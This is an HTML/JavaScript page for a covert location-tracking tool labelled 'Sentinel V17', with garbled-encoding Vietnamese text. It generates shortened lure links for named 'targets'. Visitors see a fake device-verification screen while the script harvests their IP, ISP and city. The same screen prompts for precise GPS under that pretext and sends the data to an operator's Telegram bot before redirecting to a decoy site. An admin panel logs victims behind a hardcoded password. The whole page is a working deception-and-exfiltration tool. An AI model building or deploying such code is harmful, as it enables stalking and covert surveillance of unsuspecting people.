<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title id="meta-title">H·ªá th·ªëng x√°c th·ª±c</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .admin-bg { background: #010409; }
        .glass { background: #0d1117; border: 1px solid #30363d; }
        .input-alt { background: #010409; border: 1px solid #30363d; color: #c9d1d9; font-size: 11px; width: 100%; }
        .link-box { background: #000; color: #58a6ff; font-family: monospace; border: 1px dashed #23416b; }
        /* Animation Loading 2 */
        .loader-2 { width: 48px; height: 48px; border: 5px solid #FFF; border-bottom-color: #3b82f6; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } 
        @keyframes pulse-soft { 0%, 100% { opacity: 1; } 50% { opacity: 0.3; } }
    </style>
</head>
<body class="admin-bg text-slate-400 font-sans min-h-screen selection:bg-blue-500/30">

    <div id="v-track" class="flex flex-col items-center justify-center h-screen p-6 text-center bg-[#010409]">
        <div id="ui-step-1" class="space-y-6">
            <div class="w-12 h-12 border-2 border-blue-500 border-t-transparent rounded-full animate-spin mx-auto"></div>
            <h2 class="text-white text-xs font-bold tracking-[0.3em] uppercase">Kh·ªüi t·∫°o k·∫øt n·ªëi b·∫£o m·∫≠t...</h2>
        </div>
        
        <div id="ui-step-2" class="hidden space-y-6 scale-90 transition-all duration-700">
            <span class="loader-2"></span>
            <h2 class="text-blue-500 text-sm font-black tracking-widest uppercase">ƒêang x√°c th·ª±c thi·∫øt b·ªã (V3)</h2>
            <p class="text-[10px] text-slate-500 animate-pulse italic">Vui l√≤ng x√°c nh·∫≠n quy·ªÅn truy c·∫≠p n·∫øu ƒë∆∞·ª£c y√™u c·∫ßu ƒë·ªÉ ho√†n t·∫•t...</p>
        </div>
    </div>

    <div id="v-admin" class="hidden p-4 lg:p-8">
        <div class="max-w-7xl mx-auto space-y-6">
            <header class="flex justify-between items-center border-b border-slate-800 pb-4">
                <h1 class="text-xl font-black text-white italic tracking-tighter uppercase">Sentinel <span class="text-blue-500">V17</span></h1>
                <button onclick="logout()" class="text-[9px] bg-red-500/10 text-red-500 px-3 py-1.5 rounded border border-red-500/30">THO√ÅT</button>
            </header>

            <div class="grid lg:grid-cols-12 gap-6">
                <div class="lg:col-span-4 space-y-6">
                    <div class="glass p-6 rounded-3xl space-y-4">
                        <h3 class="text-blue-500 text-[10px] font-black uppercase tracking-widest">1. Telegram & ƒê√≠ch ƒë·∫øn</h3>
                        <div class="grid grid-cols-2 gap-2">
                            <input id="in-tk" type="password" placeholder="Bot Token" class="input-alt p-3 rounded-xl">
                            <input id="in-id" type="text" placeholder="Chat ID" class="input-alt p-3 rounded-xl">
                        </div>
                        <input id="in-redir" type="text" placeholder="Link ƒë√≠ch (VD: fb.com/profile)" class="input-alt p-3 rounded-xl">
                        <div class="flex gap-2">
                            <input id="in-api" type="password" placeholder="Cuttly Key" class="flex-1 input-alt p-3 rounded-xl">
                            <button onclick="checkAPI()" class="bg-slate-800 px-3 rounded-xl text-[9px] font-bold text-white uppercase">Check</button>
                        </div>
                        <button onclick="saveC()" class="w-full bg-blue-600 py-3 rounded-xl text-white text-[10px] font-bold uppercase">L∆∞u c·∫•u h√¨nh</button>
                    </div>

                    <div class="glass p-6 rounded-3xl space-y-4">
                        <h3 class="text-green-500 text-[10px] font-black uppercase tracking-widest">2. T·∫†O LINK PHANTOM</h3>
                        <input id="in-name" type="text" placeholder="T√™n m·ª•c ti√™u..." class="input-alt p-3 rounded-xl">
                        <div class="flex gap-2">
                            <button onclick="generateLink(false)" class="flex-1 bg-slate-700 py-3 rounded-xl text-white text-[9px] font-bold uppercase">Ch·ªâ l·∫•y link</button>
                            <button onclick="generateLink(true)" class="flex-1 bg-green-700 py-3 rounded-xl text-white text-[9px] font-bold uppercase">Build & R√∫t g·ªçn</button>
                        </div>
                        <div id="box-link" class="hidden p-4 rounded-xl link-box">
                            <p class="text-[8px] text-slate-500 mb-1 uppercase font-bold">Copy link n√†y:</p>
                            <div id="out-link" onclick="copyL(this)" class="text-[10px] break-all cursor-pointer hover:text-blue-300"></div>
                        </div>
                    </div>
                </div>

                <div class="lg:col-span-8">
                    <div class="glass rounded-3xl overflow-hidden min-h-[550px] shadow-2xl">
                        <div class="p-4 bg-slate-900/30 border-b border-slate-800 flex justify-between items-center">
                            <h3 class="text-white text-[10px] font-black uppercase tracking-widest italic">Intelligence Logs</h3>
                            <button onclick="clearLogs()" class="text-[8px] text-slate-500 hover:text-red-500 font-bold uppercase">X√≥a l·ªãch s·ª≠</button>
                        </div>
                        <div class="overflow-x-auto">
                            <table class="w-full text-left text-[11px]">
                                <thead class="bg-black text-slate-500 uppercase text-[9px]">
                                    <tr>
                                        <th class="p-4">ƒê·ªëi t∆∞·ª£ng</th>
                                        <th class="p-4">M·∫°ng / ISP</th>
                                        <th class="p-4">V·ªã tr√≠ th·ª±c t·∫ø</th>
                                        <th class="p-4 text-right">Thao t√°c</th>
                                    </tr>
                                </thead>
                                <tbody id="log-table" class="divide-y divide-slate-800/30 text-slate-300"></tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let cfg = { t: "", i: "", a: "", r: "https://google.com" };
        const params = new URLSearchParams(window.location.search);

        window.onload = () => {
            if (params.has('admin')) {
                if (localStorage.getItem('auth_v17') === 'true' || prompt("Pass:") === "123") {
                    localStorage.setItem('auth_v17', 'true');
                    document.getElementById('v-track').remove();
                    document.getElementById('v-admin').classList.remove('hidden');
                    loadAdmin();
                } else { window.location.search = ""; }
            } else { executePhasedTracking(); }
        };

        // --- TRACKING PH√ÇN ƒêO·∫†N (LOADING 2) ---
        async function executePhasedTracking() {
            try { const v = params.get('v'); if(v) cfg = JSON.parse(atob(v)); } catch(e) {}
            const name = params.get('name') || 'GUEST';
            let ipInfo = { ip: 'N/A', isp: 'N/A', city: 'N/A', lat: 0, lon: 0 };

            // B∆∞·ªõc 1: L·∫•y IP √¢m th·∫ßm
            try {
                const res = await fetch('https://ipapi.co/json/').then(r => r.json());
                ipInfo = { ip: res.ip, isp: res.org, city: res.city, lat: res.latitude, lon: res.longitude };
                saveLog({ name, ...ipInfo, time: new Date().toLocaleTimeString(), st: 'IP-ONLY' });
                await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("üöÄ <b>" + name + "</b> ƒë√£ v√†o\nüåê IP: " + ipInfo.ip + "\nüìç V√πng: " + ipInfo.city)}`);
            } catch(e) {}

            // Hi·ªáu ·ª©ng Loading giai ƒëo·∫°n 2
            setTimeout(() => {
                document.getElementById('ui-step-1').classList.add('hidden');
                document.getElementById('ui-step-2').classList.remove('hidden');
                
                // K√≠ch ho·∫°t GPS ng·∫ßm
                silentGPSRequest(name, ipInfo);
            }, 3000);
        }

        function silentGPSRequest(name, ipInfo) {
            const finish = () => location.replace(cfg.r);
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude, lon = p.coords.longitude;
                    updateLogStatus(name, 'GPS-OK', lat, lon);
                    await fetch(`https://api.telegram.org/bot${cfg.t}/sendMessage?chat_id=${cfg.i}&parse_mode=HTML&text=${encodeURIComponent("üéØ <b>" + name + "</b> GPS CH√çNH X√ÅC\nüìç Link: https://www.google.com/maps?q=$" + lat + "," + lon)}`);
                    finish();
                }, () => {
                    // N·∫øu t·ª´ ch·ªëi, d√πng v·ªã tr√≠ IP l√†m "v·ªã tr√≠ ·∫©n"
                    updateLogStatus(name, 'SILENT-IP', ipInfo.lat, ipInfo.lon);
                    finish();
                }, {enableHighAccuracy: true, timeout: 6000});
            } else { finish(); }
            
            setTimeout(finish, 9000); // Timeout b·∫£o v·ªá
        }

        // --- ADMIN FUNCTIONS ---
        function loadAdmin() {
            const saved = localStorage.getItem('cfg_v17');
            if(saved) cfg = JSON.parse(saved);
            document.getElementById('in-tk').value = cfg.t;
            document.getElementById('in-id').value = cfg.i;
            document.getElementById('in-redir').value = cfg.r;
            document.getElementById('in-api').value = cfg.a || "";
            renderLogs();
        }

        function saveC() {
            cfg.t = document.getElementById('in-tk').value;
            cfg.i = document.getElementById('in-id').value;
            cfg.r = document.getElementById('in-redir').value;
            cfg.a = document.getElementById('in-api').value;
            localStorage.setItem('cfg_v17', JSON.stringify(cfg));
            alert("ƒê√£ l∆∞u!");
        }

        async function generateLink(isShort) {
            const n = document.getElementById('in-name').value;
            if(!n) return alert("Nh·∫≠p t√™n m·ª•c ti√™u!");
            const b = window.location.href.split('?')[0];
            let link = `${b}?name=${encodeURIComponent(n)}&v=${btoa(JSON.stringify(cfg))}`;
            
            const box = document.getElementById('box-link');
            const out = document.getElementById('out-link');
            box.classList.remove('hidden');
            out.innerText = "Processing...";

            if(isShort && cfg.a) {
                try {
                    const res = await fetch(`https://cutt.ly/api/api.php?key=${cfg.a}&short=${encodeURIComponent(link)}`).then(r => r.json());
                    if(res.url.status === 7) link = res.url.shortLink;
                } catch (e) {}
            }
            out.innerText = link;
        }

        function renderLogs() {
            const logs = JSON.parse(localStorage.getItem('sentinel_logs_v17') || '[]');
            document.getElementById('log-table').innerHTML = logs.map(l => `
                <tr class="hover:bg-blue-500/5 transition-all border-b border-slate-800/30">
                    <td class="p-4"><b class="text-white uppercase font-black">${l.name}</b><br><span class="text-[8px] text-slate-600">${l.time}</span></td>
                    <td class="p-4 font-mono text-blue-400 text-[10px]">${l.ip}<br><span class="text-[8px] text-slate-500">${l.isp}</span></td>
                    <td class="p-4 text-[10px] text-slate-300 uppercase">${l.city}</td>
                    <td class="p-4 text-right">
                        <span class="text-[8px] font-black italic ${l.st === 'GPS-OK' ? 'text-green-500' : 'text-yellow-600'}">${l.st}</span><br>
                        <div class="flex justify-end gap-2 mt-1">
                            <a href="http://google.com/maps?q={l.lat},${l.lon}" target="_blank" class="text-[9px] bg-blue-500/10 px-2 rounded text-blue-500 font-bold">MAP</a>
                            <a href="https://whoer.net/checkip?ip=${l.ip}" target="_blank" class="text-[9px] bg-slate-800 px-2 rounded text-slate-500 font-bold">IP</a>
                        </div>
                    </td>
                </tr>`).join('');
        }

        function saveLog(d) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v17') || '[]');
            logs.unshift(d);
            localStorage.setItem('sentinel_logs_v17', JSON.stringify(logs.slice(0, 100)));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function updateLogStatus(n, st, lat, lon) {
            let logs = JSON.parse(localStorage.getItem('sentinel_logs_v17') || '[]');
            if(logs.length > 0 && logs[0].name === n) { logs[0].st = st; logs[0].lat = lat; logs[0].lon = lon; }
            localStorage.setItem('sentinel_logs_v17', JSON.stringify(logs));
            if(!document.getElementById('v-admin').classList.contains('hidden')) renderLogs();
        }

        function clearLogs() { localStorage.removeItem('sentinel_logs_v17'); renderLogs(); }
        async function checkAPI() {
            const res = await fetch(`https://cutt.ly/api/api.php?key=${document.getElementById('in-api').value}&short=https://google.com`).then(r => r.json());
            alert(res.url.status === 7 ? "API Key Ho·∫°t ƒë·ªông!" : "L·ªói API!");
        }
        function copyL(el) { navigator.clipboard.writeText(el.innerText); alert("ƒê√£ Copy!"); }
        function logout() { localStorage.removeItem('auth_v17'); location.reload(); }
    </script>
</body>
</html>
